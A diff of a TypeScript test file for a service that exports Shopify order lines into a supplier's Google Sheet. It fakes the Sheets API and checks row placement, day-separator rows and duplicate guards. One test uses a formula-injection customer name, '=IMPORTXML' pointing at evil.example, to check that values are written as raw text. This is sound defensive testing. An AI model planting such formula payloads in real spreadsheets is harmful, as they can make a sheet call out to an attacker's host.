@@ -27,11 +27,17 @@ let storeId = ''
 let adminToken = ''
 let seq = 0
 let tabs: Record<string, string[][]>
-let appends: { tab: string; rows: string[][]; query: URLSearchParams }[]
+let writes: { tab: string; row: number; rows: (string | null)[][]; query: URLSearchParams }[]
+let colors: Record<string, Record<number, { red?: number; green?: number; blue?: number }>>
+let gridRows: Record<string, number>
+let requests: any[]
 let onReadBack: ((rows: string[][]) => string[][]) | null
 let refuseWrite: boolean
 
-/** A spreadsheet as Google's API serves it: append adds rows after the table and answers with the range it wrote. */
+/**
+ * A spreadsheet as Google's API serves it: a grid of rows, values trimmed after the last filled row, colours apart from
+ * values. "append" fails the test: on the real sheet it landed on row 1 (11/05/2026, LIT6023_1).
+ */
 function fakeGoogle() {
   vi.stubGlobal('fetch', vi.fn(async (input: any, init?: RequestInit) => {
     const url = new URL(String(input))
@@ -39,18 +45,48 @@ function fakeGoogle() {
     if (url.host === 'oauth2.googleapis.com') return json({ access_token: 'tok', expires_in: 3600 })
     const path = decodeURIComponent(url.pathname)
     expect(path.startsWith(`/v4/spreadsheets/${SHEET}`)).toBe(true)
-    if (!path.includes('/values/')) return json({ sheets: Object.keys(tabs).map(title => ({ properties: { title } })) })
+    expect(path).not.toContain(':append')
+    if (path.endsWith(':batchUpdate')) {
+      for (const r of JSON.parse(String(init?.body)).requests) {
+        requests.push(r)
+        if (r.appendDimension) gridRows[TAB] += r.appendDimension.length
+        if (r.repeatCell) {
+          colors[TAB] = colors[TAB] ?? {}
+          colors[TAB][r.repeatCell.range.startRowIndex + 1] = r.repeatCell.cell.userEnteredFormat.backgroundColor
+        }
+      }
+      return json({})
+    }
+    if (!path.includes('/values/')) {
+      const ranges = url.searchParams.get('ranges')
+      if (ranges) {
+        const m = ranges.match(/^'(.*)'!A(\d+):A(\d+)$/)!
+        if (Number(m[3]) > gridRows[m[1]]) return json({ error: { message: 'Range exceeds grid limits' } }, 400)
+        const rowData = []
+        for (let n = Number(m[2]); n <= Number(m[3]); n++) {
+          const c = colors[m[1]]?.[n]
+          rowData.push(c ? { values: [{ effectiveFormat: { backgroundColor: c } }] } : {})
+        }
+        return json({ sheets: [{ data: [{ rowData }] }] })
+      }
+      return json({ sheets: Object.keys(tabs).map((title, sheetId) => ({ properties: { title, sheetId, gridProperties: { rowCount: gridRows[title] } } })) })
+    }
     const range = path.split('/values/')[1]
     const tab = range.match(/^'(.*)'!/)?.[1] ?? ''
-    if (range.endsWith(':append')) {
+    if (init?.method === 'PUT') {
       if (refuseWrite) return json({ error: { message: 'The caller does not have permission' } }, 403)
-      const rows: string[][] = JSON.parse(String(init?.body)).values
-      appends.push({ tab, rows, query: url.searchParams })
-      const first = tabs[tab].length + 1
-      tabs[tab].push(...rows)
-      return json({ updates: { updatedRange: `'${tab}'!A${first}:Y${first + rows.length - 1}` } })
+      const m = range.match(/!A(\d+):[A-Z]+(\d+)$/)!
+      if (Number(m[2]) > gridRows[tab]) return json({ error: { message: 'Range exceeds grid limits' } }, 400)
+      const rows: (string | null)[][] = JSON.parse(String(init?.body)).values
+      writes.push({ tab, row: Number(m[1]), rows, query: url.searchParams })
+      rows.forEach((r, i) => {
+        const at = Number(m[1]) - 1 + i
+        while (tabs[tab].length <= at) tabs[tab].push([])
+        tabs[tab][at] = r.map(c => c ?? '')
+      })
+      return json({ updatedRange: range })
     }
-    const written = range.match(/!A(\d+):Y(\d+)$/)
+    const written = range.match(/!A(\d+):[A-Z]+(\d+)$/)
     if (written) {
       const rows = tabs[tab].slice(Number(written[1]) - 1, Number(written[2]))
       return json({ values: onReadBack ? onReadBack(rows) : rows })
@@ -122,7 +158,10 @@ beforeAll(async () => {
 
 beforeEach(async () => {
   tabs = { [TAB]: [HEADERS], 'ORDER 10-2026': [HEADERS] }
-  appends = []
+  writes = []
+  colors = {}
+  gridRows = { [TAB]: 200, 'ORDER 10-2026': 200 }
+  requests = []
   onReadBack = null
   refuseWrite = false
   global.__sheetsTokenCache = null
@@ -150,8 +189,9 @@ describe('writing to the sheet', () => {
     const r = await push([o.id])
     expect(r.tabName).toBe(TAB)
     expect(r.results).toEqual([expect.objectContaining({ lineKey: o.key, status: 'WRITTEN', message: 'Hàng 2' })])
-    const row = appends[0].rows[0]
-    expect(appends[0].tab).toBe(TAB)
+    const row = writes[0].rows[0].map(c => c ?? '')
+    expect(writes[0].tab).toBe(TAB)
+    expect(writes[0].row).toBe(2)
     expect(row[0]).toBe('11/4/2026')
     expect(rowOf(row, 'Order Number')).toBe(`#${o.key}`)
     expect(rowOf(row, 'Order Vendor ')).toBe(o.code)
@@ -163,7 +203,7 @@ describe('writing to the sheet', () => {
     expect(rowOf(row, 'Quantity')).toBe('2')
     expect(rowOf(row, 'mockup link')).toBe('https://cdn.shopify.com/s/files/preview.png')
     expect(rowOf(row, 'Design link')).toBe('https://drive.google.com/drive/folders/abc')
-    expect(rowOf(row, 'Customer Note')).toBe('')
+    expect(writes[0].rows[0][HEADERS.indexOf('Customer Note')]).toBeNull()
     expect(row.length).toBeLessThanOrEqual(HEADERS.indexOf('Design link') + 1)
 
     expect((await line(o.id)).exportedToSupplierId).toBe(SUP)
@@ -175,16 +215,15 @@ describe('writing to the sheet', () => {
   it('writes customer text as text, so a name cannot run as a formula', async () => {
     const o = await makeOrder({ name: '=IMPORTXML("https://evil.example","//a")' })
     await push([o.id])
-    expect(appends[0].query.get('valueInputOption')).toBe('RAW')
-    expect(appends[0].query.get('insertDataOption')).toBe('INSERT_ROWS')
-    expect(rowOf(appends[0].rows[0], 'Name (Shipping)')).toContain('=IMPORTXML')
+    expect(writes[0].query.get('valueInputOption')).toBe('RAW')
+    expect(writes[0].rows[0][HEADERS.indexOf('Name (Shipping)')]).toContain('=IMPORTXML')
   })
 
   it('does not write a line twice', async () => {
     const o = await makeOrder()
     await push([o.id])
     expect((await push([o.id])).results).toEqual([])
-    expect(appends).toHaveLength(1)
+    expect(writes).toHaveLength(1)
   })
 
   it.each([
@@ -196,7 +235,7 @@ describe('writing to the sheet', () => {
     const [number, vendor] = cells(o.code)
     tabs[tab].push(['10/30/2026', number, vendor])
     expect((await push([o.id])).results).toEqual([expect.objectContaining({ lineKey: o.key, status: 'ALREADY' })])
-    expect(appends).toHaveLength(0)
+    expect(writes).toHaveLength(0)
     expect((await line(o.id)).exportedToSupplierId).toBe(SUP)
   })
 
@@ -210,12 +249,77 @@ describe('writing to the sheet', () => {
   })
 })
 
+describe('where the row lands in the sheet', () => {
+  const fill = (rows: number, date: string) => {
+    for (let i = 0; i < rows; i++) tabs[TAB].push([date, `#OLD${i}`, `OLD${i}_1`])
+  }
+
+  it('goes after the green day row, never on row 1: data to 166, green 167, writes at 168', async () => {
+    fill(165, '11/2/2026')
+    tabs[TAB][90] = []
+    tabs[TAB][129] = []
+    colors[TAB] = { 91: { green: 1 }, 130: { green: 1 }, 167: { green: 1 } }
+    const o = await makeOrder()
+    const r = await push([o.id])
+    expect(writes[0].row).toBe(168)
+    expect(r.results[0]).toMatchObject({ status: 'WRITTEN', message: 'Hàng 168' })
+    expect(tabs[TAB][0]).toEqual(HEADERS)
+    expect(tabs[TAB][165][1]).toBe('#OLD164')
+    expect(tabs[TAB][167][1]).toBe(`#${o.key}`)
+    expect(requests).toEqual([])
+    expect(await prisma.supplierSheetWrite.findFirst({ where: { orderId: o.id } })).toMatchObject({ rowRange: 'A168' })
+  })
+
+  it('stays under the last row on the same day, with no new day row', async () => {
+    fill(3, '11/4/2026')
+    const o = await makeOrder()
+    await push([o.id])
+    expect(writes[0].row).toBe(5)
+    expect(requests).toEqual([])
+  })
+
+  it('adds the green row on the first send of a new day', async () => {
+    fill(3, '11/3/2026')
+    const o = await makeOrder()
+    await push([o.id])
+    expect(requests[0].repeatCell.range).toMatchObject({ startRowIndex: 4, endRowIndex: 5 })
+    expect(requests[0].repeatCell.cell.userEnteredFormat.backgroundColor).toMatchObject({ green: 1 })
+    expect(writes[0].row).toBe(6)
+  })
+
+  it('reads colours only inside the grid: the last data row can be the last row of the tab', async () => {
+    fill(3, '11/4/2026')
+    gridRows[TAB] = 4
+    const o = await makeOrder()
+    expect((await push([o.id])).results[0]).toMatchObject({ status: 'WRITTEN', message: 'Hàng 5' })
+    expect(requests[0].appendDimension.length).toBe(1)
+  })
+
+  it('adds grid rows when the send runs past the bottom of the tab', async () => {
+    fill(3, '11/4/2026')
+    gridRows[TAB] = 4
+    const o = await makeOrder()
+    const r = await push([o.id])
+    expect(requests[0].appendDimension.length).toBe(1)
+    expect(r.results[0].status).toBe('WRITTEN')
+  })
+
+  it('leaves unmapped cells alone: Price and Tracking are not in the write', async () => {
+    const o = await makeOrder()
+    await push([o.id])
+    const row = writes[0].rows[0]
+    expect(row.length).toBe(HEADERS.indexOf('Design link') + 1)
+    expect(row[HEADERS.indexOf('Design Back')]).toBeUndefined()
+    expect(row[HEADERS.indexOf('Customer Note')]).toBeNull()
+  })
+})
+
 describe('what stops a send', () => {
   it('stops when the month has no tab, and does not create one', async () => {
     delete tabs[TAB]
     const o = await makeOrder()
     await expect(push([o.id])).rejects.toMatchObject({ code: 'NO_TAB' })
-    expect(appends).toHaveLength(0)
+    expect(writes).toHaveLength(0)
     expect((await line(o.id)).exportedAt).toBeNull()
   })
 
@@ -223,13 +327,13 @@ describe('what stops a send', () => {
     const o = await makeOrder()
     tabs[TAB][0] = HEADERS.filter(h => h !== 'Custom Name')
     await expect(push([o.id])).rejects.toMatchObject({ code: 'COLUMNS' })
-    expect(appends).toHaveLength(0)
+    expect(writes).toHaveLength(0)
 
     const moved = ['       ', 'New Column', ...HEADERS.slice(1)]
     tabs[TAB][0] = moved
     const r = await push([o.id])
     expect(r.results[0].status).toBe('WRITTEN')
-    expect(appends[0].rows[0][moved.indexOf('Custom Name')]).toBe('Allyssa')
+    expect(writes[0].rows[0][moved.indexOf('Custom Name')]).toBe('Allyssa')
   })
 
   it('blocks a line with no mockup and sends the rest', async () => {
@@ -239,14 +343,14 @@ describe('what stops a send', () => {
     expect(r.results.find(x => x.lineKey === bad.key)).toMatchObject({ status: 'BLOCKED' })
     expect(r.results.find(x => x.lineKey === good.key)).toMatchObject({ status: 'WRITTEN' })
     expect((await line(bad.id)).exportedAt).toBeNull()
-    expect(appends[0].rows).toHaveLength(1)
+    expect(writes[0].rows).toHaveLength(1)
   })
 
   it('never writes another store’s customers into this sheet', async () => {
     const o = await makeOrder({ shop: 'another-store.myshopify.com' })
     const r = await push([o.id])
     expect(r.results[0]).toMatchObject({ status: 'BLOCKED' })
-    expect(appends).toHaveLength(0)
+    expect(writes).toHaveLength(0)
   })
 
   it('does not mark a line when the row reads back different, and the next send finds it in the sheet', async () => {
@@ -258,7 +362,7 @@ describe('what stops a send', () => {
 
     onReadBack = null
     expect((await push([o.id])).results[0]).toMatchObject({ status: 'ALREADY' })
-    expect(appends).toHaveLength(1)
+    expect(writes).toHaveLength(1)
   })
 
   it('reports a refused write and marks nothing', async () => {
